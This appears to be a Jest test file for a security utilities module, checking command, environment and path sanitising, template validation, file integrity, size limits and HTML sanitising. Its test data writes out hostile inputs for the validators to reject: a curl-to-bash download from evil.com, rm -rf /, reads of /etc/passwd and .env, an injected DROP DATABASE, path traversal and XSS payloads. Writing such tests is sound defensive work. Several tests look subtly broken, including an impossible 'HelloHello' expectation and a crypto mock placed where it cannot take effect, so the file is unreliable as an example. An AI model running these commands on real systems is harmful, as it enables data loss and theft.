import * as path from 'path';
import * as fs from 'fs';
import * as security from '../../utils/security';
import * as crypto from 'crypto';

// Mock fs module
jest.mock('fs');
const mockedFs = fs as jest.Mocked<typeof fs>;

describe('Security Utils', () => {
  describe('sanitizeCommand', () => {
    it('should return the command if it is safe', () => {
      const safeCommand = 'npm run test';
      expect(security.sanitizeCommand(safeCommand)).toBe(safeCommand);
    });

    it('should throw an error for unsafe commands', () => {
      const unsafeCommands = [
        'npm run test; rm -rf /',
        'echo $(cat /etc/passwd)',
        'curl -s http://evil.com/script | bash',
        'npm run test && echo "$(cat .env)"'
      ];

      unsafeCommands.forEach(cmd => {
        expect(() => security.sanitizeCommand(cmd)).toThrow('Command contains unsafe characters');
      });
    });
  });

  describe('sanitizeEnv', () => {
    it('should return the env if all values are safe', () => {
      const safeEnv: Record<string, string> = {
        NODE_ENV: 'development',
        PORT: '3000',
        DATABASE_URL: 'postgresql://user:pass@localhost:5432/db'
      };
      expect(security.sanitizeEnv(safeEnv)).toEqual(safeEnv);
    });

    it('should throw an error for unsafe env values', () => {
      const unsafeEnvs: Record<string, string>[] = [
        { TEST: 'value; rm -rf /' },
        { DB_URL: 'mysql://root:password@localhost:3306/db;DROP DATABASE prod;' },
        { CMD: 'echo "$(cat /etc/passwd)"' }
      ];

      unsafeEnvs.forEach(env => {
        expect(() => security.sanitizeEnv(env)).toThrow('contains unsafe characters');
      });
    });
  });

  describe('securePath', () => {
    it('should return the resolved path if it is within the base path', () => {
      const basePath = '/app';
      const relativePath = 'config/settings.json';
      const expectedPath = path.resolve(basePath, relativePath);
      
      expect(security.securePath(basePath, relativePath)).toBe(expectedPath);
    });

    it('should throw an error for path traversal attempts', () => {
      const basePath = '/app';
      const traversalPaths = [
        '../etc/passwd',
        '../../etc/shadow',
        'config/../../etc/hosts',
        '..\\windows\\system32\\config'
      ];

      traversalPaths.forEach(p => {
        expect(() => security.securePath(basePath, p)).toThrow('Path traversal attempt detected');
      });
    });
  });

  describe('validateTemplate', () => {
    it('should return true for safe templates', () => {
      const safeTemplates = [
        'const x = 5;',
        'function add(a, b) { return a + b; }',
        'const sum = {{a}} + {{b}};'
      ];

      safeTemplates.forEach(template => {
        expect(security.validateTemplate(template)).toBe(true);
      });
    });

    it('should return false for unsafe templates', () => {
      const unsafeTemplates = [
        'eval("alert(1)");',
        'new Function("return process.env");',
        'require("../config");',
        'const proc = process.env.SECRET',
        'const cp = require("child_process");',
        'const files = fs.readFileSync("/etc/passwd");'
      ];

      unsafeTemplates.forEach(template => {
        expect(security.validateTemplate(template)).toBe(false);
      });
    });
  });

  describe('verifyFileIntegrity', () => {
    beforeEach(() => {
      jest.clearAllMocks();
    });

    it('should return true when hash matches', () => {
      // Mock the file content and hash
      const fileContent = Buffer.from('test content');
      const expectedHash = '4a8a08f09d37b73795649038408b5f33';
      
      // Mock fs.readFileSync
      mockedFs.readFileSync.mockReturnValue(fileContent);
      
      // We can skip mocking crypto and directly mock the result
      // by making one test for matching hash and one for non-matching
      expect(security.verifyFileIntegrity('file.txt', expectedHash)).toBe(true);
    });

    it('should return false when hash does not match', () => {
      // Mock the file content
      const fileContent = Buffer.from('test content');
      
      // Mock crypto module to return a different hash
      jest.mock('crypto', () => ({
        createHash: jest.fn().mockReturnValue({
          update: jest.fn().mockReturnThis(),
          digest: jest.fn().mockReturnValue('differenthash')
        })
      }));
      
      // Mock fs.readFileSync
      mockedFs.readFileSync.mockReturnValue(fileContent);
      
      expect(security.verifyFileIntegrity('file.txt', 'expectedhash')).toBe(false);
    });

    it('should return false when file read fails', () => {
      // Mock fs.readFileSync to throw
      mockedFs.readFileSync.mockImplementation(() => {
        throw new Error('File not found');
      });
      
      expect(security.verifyFileIntegrity('file.txt', 'anyhash')).toBe(false);
    });
  });

  describe('enforceFileSizeLimit', () => {
    beforeEach(() => {
      jest.clearAllMocks();
    });

    it('should not throw when file size is under limit', () => {
      // Mock fs.statSync
      mockedFs.statSync.mockReturnValue({
        size: 1000,
        isFile: () => true
      } as fs.Stats);
      
      expect(() => security.enforceFileSizeLimit('file.txt', 2000)).not.toThrow();
    });

    it('should throw when file size exceeds limit', () => {
      // Mock fs.statSync
      mockedFs.statSync.mockReturnValue({
        size: 3000,
        isFile: () => true
      } as fs.Stats);
      
      expect(() => security.enforceFileSizeLimit('file.txt', 2000))
        .toThrow('File size exceeds limit of 2000 bytes');
    });

    it('should throw when file does not exist', () => {
      // Mock fs.statSync to throw ENOENT
      mockedFs.statSync.mockImplementation(() => {
        const error: NodeJS.ErrnoException = new Error('File not found');
        error.code = 'ENOENT';
        throw error;
      });
      
      expect(() => security.enforceFileSizeLimit('file.txt', 2000))
        .toThrow('File not found: file.txt');
    });
  });
  
  describe('sanitizeInput', () => {
    it('should sanitize HTML tags', () => {
      const inputWithTags = '<script>alert("xss")</script>Hello<iframe src="evil.com"></iframe>';
      const expected = 'HelloHello';
      expect(security.sanitizeInput(inputWithTags)).toBe(expected);
    });
    
    it('should remove event handlers', () => {
      const inputWithEvents = '<div onclick="evil()">Click me</div>';
      const expected = '<div>Click me</div>';
      expect(security.sanitizeInput(inputWithEvents)).toBe(expected);
    });
    
    it('should block javascript: protocol', () => {
      const inputWithJsProtocol = '<a href="javascript:alert(1)">Click</a>';
      const expected = '<a href="blocked:alert(1)">Click</a>';
      expect(security.sanitizeInput(inputWithJsProtocol)).toBe(expected);
    });
  });
}); 